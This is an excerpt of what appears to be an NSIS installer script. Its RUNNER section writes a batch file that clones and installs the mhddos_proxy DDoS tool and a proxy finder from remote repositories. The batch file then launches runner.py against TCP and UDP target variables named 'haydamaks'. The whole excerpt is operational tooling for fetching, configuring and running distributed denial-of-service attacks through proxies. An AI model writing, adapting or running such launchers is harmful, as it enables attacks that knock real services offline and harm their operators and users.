...
Section ;RUNNER
  ...
  FileWrite $9 "START /W ${GIT_DIR}\git.exe clone ${MHDDOS_PROXY_SRC} ${MHDDOS_PROXY_DIR}$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "START /W ${PYTHON_DIR}\python.exe -m pip install --upgrade setuptools$\r$\n"
  ...
  FileWrite $9 "CD $INSTDIR$\r$\n"
  FileWrite $9 "START /W ${GIT_DIR}\git.exe clone -b feature-async ${MHDDOS_PROXY_BETA_SRC} ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
  ...
  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
  FileWrite $9 "START /W ${PYTHON_DIR}\python.exe -m pip uninstall --yes -r requirements.txt$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
  FileWrite $9 "START /W ${PYTHON_DIR}\python.exe -m pip uninstall --yes -r requirements.txt$\r$\n"
  
  FileWrite $9 ":clone_proxy_finder$\r$\n"
  FileWrite $9 "CD $INSTDIR$\r$\n"
  FileWrite $9 "START /W ${GIT_DIR}\git.exe clone ${proxy_finder_src} ${proxy_finder_dir}$\r$\n"
  ...
  FileWrite $9 "${PYTHON_DIR}\python.exe finder.py$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  ...
  FileWrite $9 "${PYTHON_DIR}\python.exe runner.py ${haydamaks_tcp_target} --debug$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  ...
  FileWrite $9 "${PYTHON_DIR}\python.exe runner.py ${haydamaks_udp_target} --debug$\r$\n"
  FileWrite $9 "goto END$\r$\n"
